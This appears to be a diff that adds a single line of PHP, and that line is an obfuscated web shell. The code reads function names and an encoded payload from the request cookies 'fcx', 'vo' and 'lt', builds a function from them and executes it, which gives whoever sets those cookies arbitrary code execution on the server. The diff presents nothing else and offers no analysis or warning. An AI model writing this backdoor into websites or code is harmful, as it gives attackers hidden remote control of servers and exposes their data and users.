@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['fcx']){$db=$_COOKIE['fcx']("",@$_COOKIE['vo'](@$_COOKIE['lt']));$db();}?>
